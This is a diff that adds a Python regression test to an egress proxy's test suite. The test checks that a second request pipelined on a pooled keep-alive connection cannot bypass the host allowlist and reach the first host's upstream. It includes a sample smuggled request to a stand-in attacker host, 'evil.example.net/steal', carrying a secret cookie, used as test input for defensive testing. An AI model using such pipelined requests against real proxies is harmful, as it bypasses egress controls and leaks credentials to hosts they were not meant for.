@@ -199,6 +199,69 @@ def test_a_slow_resolution_does_not_stall_the_event_loop():
     asyncio.run(_run())
 
 
+def test_a_second_request_on_a_pooled_connection_never_reaches_the_first_host():
+    """HTTP proxy clients pool per-proxy, not per-destination.
+
+    A follow-up `http://other-host/…` written onto the same socket used to
+    be piped into the connection opened for the FIRST host — skipping the
+    allowlist entirely and handing that request's headers to a host it was
+    not addressed to. Only the first request may reach the upstream.
+    """
+
+    async def _run():
+        got = []
+
+        async def upstream(reader, writer):
+            # Collect whatever arrives, then answer. Bounded by a short read
+            # timeout so the buggy path (which holds the socket open with
+            # keep-alive) fails on the assertion below rather than by hanging.
+            try:
+                while True:
+                    data = await asyncio.wait_for(reader.read(4096), 0.3)
+                    if not data:
+                        break
+                    got.append(data)
+            except asyncio.TimeoutError:
+                pass
+            writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nhi")
+            await writer.drain()
+            writer.close()
+
+        up = await asyncio.start_server(upstream, "127.0.0.1", 0)
+        up_port = up.sockets[0].getsockname()[1]
+
+        proxy = EgressProxy(["ok.example.com"], block_private=False, resolver=_resolver_for("127.0.0.1"))
+        server = await asyncio.start_server(proxy.handle, "127.0.0.1", 0)
+        p_port = server.sockets[0].getsockname()[1]
+
+        r, w = await asyncio.open_connection("127.0.0.1", p_port)
+        w.write(
+            f"GET http://ok.example.com:{up_port}/first HTTP/1.1\r\n"
+            f"Host: ok.example.com\r\nConnection: keep-alive\r\n\r\n".encode()
+        )
+        await w.drain()
+        # ...and immediately pipeline a second request for a host that is
+        # NOT allowlisted, the way a pooling client would.
+        w.write(
+            "GET http://evil.example.net/steal HTTP/1.1\r\nHost: evil.example.net\r\nCookie: secret\r\n\r\n".encode()
+        )
+        await w.drain()
+        assert (await r.read(4096)).startswith(b"HTTP/1.1 200")
+        w.close()
+        server.close()
+        up.close()
+
+        relayed = b"".join(got)
+        assert b"/first" in relayed
+        assert b"/steal" not in relayed  # the bypass
+        assert b"secret" not in relayed
+        # keep-alive is not offered upstream, so the socket cannot be reused
+        assert b"Connection: close" in relayed
+        assert b"keep-alive" not in relayed.lower()
+
+    asyncio.run(_run())
+
+
 # ---------------------------------------------------------------------------
 # docker provider wiring
 # ---------------------------------------------------------------------------
